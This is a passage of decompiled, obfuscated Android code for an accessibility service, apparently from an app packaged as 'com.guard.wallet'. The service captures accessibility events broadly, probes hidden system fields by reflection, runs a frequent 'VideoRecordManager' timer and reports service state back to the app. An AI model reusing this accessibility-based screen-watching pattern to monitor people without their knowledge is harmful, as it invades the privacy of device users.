         } catch (Exception var14) {
            var10000 = var14;
            boolean var54 = false;
         }
      }

      Exception var36 = var10000;
      a1.q.s("MyAccessibilityService", var36);
      return new NoticeRootChangedVO((UiObject)var8.get(), (String)var7.get(), (String)var6.get());
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onAccessibilityEvent(AccessibilityEvent var1) {
      ReentrantLock var2 = this.l;
      if (!var2.tryLock()) {
         StringBuilder var17 = new StringBuilder("onAccessibilityEvent 事件被忽略:");
         var17.append(var1.toString());
         Log.e("MyAccessibilityService", var17.toString());
      } else {
         label95: {
            Exception var10000;
            label100: {
               try {
                  super.h.set(true);
                  AtomicReference var3 = p;
                  if (var3.get() == null) {
                     var3.set(this);
                  }
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var10001 = false;
                  break label100;
               }

               try {
                  if (this.U(var1)) {
                     var2.unlock();
                     return;
                  }
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var20 = false;
                  break label100;
               }

               try {
                  if (w.a.a()) {
                     var2.unlock();
                     return;
                  }
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var21 = false;
                  break label100;
               }

               try {
                  this.G(var1);
                  this.f0(var1);
                  this.b0(var1);
                  this.c0(var1);
               } catch (Exception var10) {
                  var10000 = var10;
                  boolean var22 = false;
                  break label100;
               }

               label103: {
                  try {
                     if (this.X(var1)) {
                        break label95;
                     }
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var23 = false;
                     break label103;
                  }

                  label74: {
                     try {
                        if (this.o == null) {
                           break label95;
                        }

                        if (VERSION.SDK_INT >= 30) {
                           a.a.v();
                           var1 = a0.h.i(var1);
                           break label74;
                        }
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var24 = false;
                        break label103;
                     }

                     try {
                        var1 = AccessibilityEvent.obtain(var1);
                     } catch (Exception var7) {
                        var10000 = var7;
                        boolean var25 = false;
                        break label103;
                     }
                  }

                  try {
                     ThreadPoolExecutor var18 = this.o;
                     b0 var4 = new b0(this, var1, 1);
                     var18.submit(var4);
                     break label95;
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var26 = false;
                  }
               }

               Exception var15 = var10000;

               try {
                  a1.q.s("MyAccessibilityService", var15);
                  break label95;
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var27 = false;
               }
            }

            Exception var16 = var10000;
            a1.q.s("MyAccessibilityService", var16);
            Log.e("MyAccessibilityService", "onAccessibilityEvent 出错");
         }

         var2.unlock();
      }
   }

   public final void onCreate() {
      super.onCreate();

      try {
         s.set(null);
         t.set(null);
         u.set(null);
         v.set(null);
         Log.d("MyAccessibilityService", "MyAccessibilityService on create");
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void onDestroy() {
      Log.d("MyAccessibilityService", "无障碍服务已销毁");

      label104: {
         Exception var10000;
         label108: {
            ThreadPoolExecutor var1;
            try {
               super.h.set(false);
               var1 = this.o;
            } catch (Exception var16) {
               var10000 = var16;
               boolean var10001 = false;
               break label108;
            }

            if (var1 != null) {
               try {
                  var1.shutdownNow();
                  this.o = null;
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var24 = false;
                  break label108;
               }
            }

            try {
               super.g.d();
               var17 = super.e;
               var17.getClass();
            } catch (Exception var14) {
               var10000 = var14;
               boolean var25 = false;
               break label108;
            }

            try {
               var17.a.shutdownNow();
            } catch (Exception var13) {
               Exception var18 = var13;

               try {
                  a1.q.s("o.r", var18);
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var26 = false;
                  break label108;
               }
            }

            try {
               var19 = this.m;
            } catch (Exception var11) {
               var10000 = var11;
               boolean var27 = false;
               break label108;
            }

            if (var19 != null) {
               try {
                  d0.a.i.shutdownNow();
                  d0.a.j.clear();
                  var19.d.cancel();
                  var19.b.set(false);
                  var19.a.clear();
               } catch (Exception var10) {
                  Exception var20 = var10;

                  try {
                     a1.q.s("VideoRecordManager", var20);
                  } catch (Exception var9) {
                     var10000 = var9;
                     boolean var28 = false;
                     break label108;
                  }
               }

               try {
                  this.m = null;
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var29 = false;
                  break label108;
               }
            }

            try {
               s.set(null);
               t.set(null);
               u.set(null);
               v.set(null);
               this.D();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var30 = false;
               break label108;
            }

            ConcurrentLinkedQueue var21 = super.a;

            try {
               if (!var21.isEmpty()) {
                  a0.a var23 = new a0.a(this, 4);
                  var21.removeIf(var23);
               }
            } catch (Exception var6) {
               Exception var2 = var6;

               try {
                  a1.q.s("com.guard.wallet.service.AccessibilityDelegateManager", var2);
               } catch (Exception var5) {
                  var10000 = var5;
                  boolean var31 = false;
                  break label108;
               }
            }

            try {
               var21.clear();
               this.k.set(0);
               super.b.clear();
               super.c.clear();
               super.d.clear();
               this.q0();
               if (MainApplication.getInstance() != null) {
                  MainApplication.getInstance().offerStrategyEvent("ACCESSIBILITY_SERVICE_OFF");
               }
            } catch (Exception var4) {
               var10000 = var4;
               boolean var32 = false;
               break label108;
            }

            try {
               p.set(null);
               break label104;
            } catch (Exception var3) {
               var10000 = var3;
               boolean var33 = false;
            }
         }

         Exception var22 = var10000;
         a1.q.s("MyAccessibilityService", var22);
      }

      super.onDestroy();
   }

   public final void onInterrupt() {
      Log.d("MyAccessibilityService", "无障碍服务已中断");
   }

   public final void onLowMemory() {
      try {
         Log.d("MyAccessibilityService", "无障碍服务 onLowMemory");
         this.H(true, true);
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }

      super.onLowMemory();
   }

   public final void onRebind(Intent var1) {
      super.onRebind(var1);

      try {
         Log.d("MyAccessibilityService", "无障碍服务已重启");
         s.set(null);
         t.set(null);
         u.set(null);
         v.set(null);
         this.j0();
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }
   }

   public final void onServiceConnected() {
      super.onServiceConnected();

      try {
         this.r0();
         this.j0();
      } catch (Exception var2) {
         a1.q.s("MyAccessibilityService", var2);
      }
   }

   public final void onStart(Intent var1, int var2) {
      super.onStart(var1, var2);
      Log.d("MyAccessibilityService", "MyAccessibilityService on start");
   }

   public final void onTaskRemoved(Intent var1) {
      super.onTaskRemoved(var1);
      Log.d("MyAccessibilityService", "Service on task removed");
   }

   public final void onTrimMemory(int var1) {
      try {
         StringBuilder var2 = new StringBuilder("无障碍服务 onTrimMemory level:");
         var2.append(var1);
         Log.d("MyAccessibilityService", var2.toString());
         this.H(true, true);
      } catch (Exception var3) {
         a1.q.s("MyAccessibilityService", var3);
      }

      super.onTrimMemory(var1);
   }

   public final boolean onUnbind(Intent var1) {
      Log.d("MyAccessibilityService", "无障碍服务已关闭");
      return super.onUnbind(var1);
   }

   public final void p0() {
      try {
         MessageRecordVO var2 = new MessageRecordVO();
         ContainerEventVO var1 = new ContainerEventVO();
         var1.setPackageName(this.getPackageName());
         var1.setContainerCode("ACCESSIBILITY_CONTAINER");
         var1.setIsOpened(1);
         var1.setServiceState(-1);
         var2.setIntentCode("android.intent.action.CONTAINER_EVENT");
         var2.setExtraBody(var1);
         if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
         }
      } catch (Exception var3) {
         a1.q.s("MyAccessibilityService", var3);
      }
   }

   public final void q0() {
      try {
         MessageRecordVO var2 = new MessageRecordVO();
         ContainerEventVO var1 = new ContainerEventVO();
         var1.setPackageName(this.getPackageName());
         var1.setContainerCode("ACCESSIBILITY_CONTAINER");
         var1.setIsOpened(0);
         var1.setServiceState(-1);
         var2.setIntentCode("android.intent.action.CONTAINER_EVENT");
         var2.setExtraBody(var1);
         if (MainApplication.getInstance() != null && MainApplication.getInstance().getHandlerMsgAndTimer() != null) {
            MainApplication.getInstance().getHandlerMsgAndTimer().b(var2);
         }
      } catch (Exception var3) {
         a1.q.s("MyAccessibilityService", var3);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void r0() {
      Exception var10000;
      label65: {
         AccessibilityServiceInfo var3;
         try {
            var3 = this.getServiceInfo();
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label65;
         }

         AtomicBoolean var2 = super.i;
         if (var3 == null) {
            try {
               Log.d("MyAccessibilityService", "ServiceInfo in Null");
               var2.set(true);
               return;
            } catch (Exception var5) {
               var10000 = var5;
               boolean var15 = false;
            }
         } else {
            label68: {
               boolean var1;
               label60: {
                  label69: {
                     label70: {
                        Field var4;
                        try {
                           var4 = AccessibilityServiceInfo.class.getDeclaredField("crashed");
                        } catch (Exception var10) {
                           var10000 = var10;
                           boolean var16 = false;
                           break label70;
                        }

                        if (var4 == null) {
                           break label69;
                        }

                        try {
                           var4.setAccessible(true);
                           var1 = var4.getBoolean(var3);
                           break label60;
                        } catch (Exception var9) {
                           var10000 = var9;
                           boolean var17 = false;
                        }
                     }

                     Exception var13 = var10000;

                     try {
                        a1.q.s("MyAccessibilityService", var13);
                     } catch (Exception var8) {
                        var10000 = var8;
                        boolean var18 = false;
                        break label68;
                     }
                  }

                  var1 = false;
               }

               try {
                  var2.set(var1);
                  var3.feedbackType = -1;
                  var3.eventTypes = 8419391;
                  var3.flags = 91;
                  var3.notificationTimeout = 0L;
                  this.setServiceInfo(var3);
                  if (VERSION.SDK_INT >= 33) {
                     this.setCacheEnabled(true);
                  }
               } catch (Exception var7) {
                  var10000 = var7;
                  boolean var19 = false;
                  break label68;
               }

               try {
                  Log.d("MyAccessibilityService", "辅助功能进入正常模式");
                  return;
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var20 = false;
               }
            }
         }
      }

      Exception var12 = var10000;
      a1.q.s("MyAccessibilityService", var12);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean s0() {
      Exception var10000;
      label49: {
         try {
            if (this.Y()) {
               return false;
            }
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label49;
         }

         try {
            if (this.m == null) {
               ScreenMetricsVO var2 = com.guard.wallet.utils.e.e();
               a var3 = new a(var2.getWidth() / 2, var2.getHeight() / 2);
               this.m = var3;
            }
         } catch (Exception var7) {
            var10000 = var7;
            boolean var13 = false;
            break label49;
         }

         boolean var1;
         a var9;
         AtomicBoolean var12;
         try {
            var9 = this.m;
            var12 = var9.b;
            var1 = var12.get();
         } catch (Exception var6) {
            var10000 = var6;
            boolean var14 = false;
            break label49;
         }

         if (var1) {
            return true;
         }

         try {
            var9.d.schedule(var9.e, 40L, 40L);
            var12.set(true);
            var9.c.set(System.currentTimeMillis());
            return true;
         } catch (Exception var5) {
            Exception var10 = var5;

            try {
               a1.q.s("VideoRecordManager", var10);
               return true;
            } catch (Exception var4) {
               var10000 = var4;
               boolean var15 = false;
            }
         }
      }

      Exception var11 = var10000;
      a1.q.s("MyAccessibilityService", var11);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean t0() {
      Exception var10000;
      label59: {
         try {
            if (!this.Y()) {
               return false;
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var10001 = false;
            break label59;
         }

         a var1;
         try {
            var1 = this.m;
         } catch (Exception var8) {
            var10000 = var8;
            boolean var14 = false;
            break label59;
         }

         if (var1 != null) {
            try {
               var1.d.cancel();
               var1.b.set(false);
               var1.c.set(System.currentTimeMillis());
               var1.a();
            } catch (Exception var7) {
               Exception var10 = var7;

               try {
                  a1.q.s("VideoRecordManager", var10);
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var15 = false;
                  break label59;
               }
            }

            try {
               var1 = this.m;
               var1.getClass();
            } catch (Exception var5) {
               var10000 = var5;
               boolean var16 = false;
               break label59;
            }

            try {
               var1.b.set(false);
               var1.a.clear();
            } catch (Exception var4) {
               Exception var12 = var4;

               try {
                  a1.q.s("VideoRecordManager", var12);
               } catch (Exception var3) {
                  var10000 = var3;
                  boolean var17 = false;
                  break label59;
               }
            }

            try {
               this.m = null;
            } catch (Exception var2) {
               var10000 = var2;
               boolean var18 = false;
               break label59;
            }
         }

         return true;
      }

      Exception var13 = var10000;
      a1.q.s("MyAccessibilityService", var13);
      return false;
   }
}
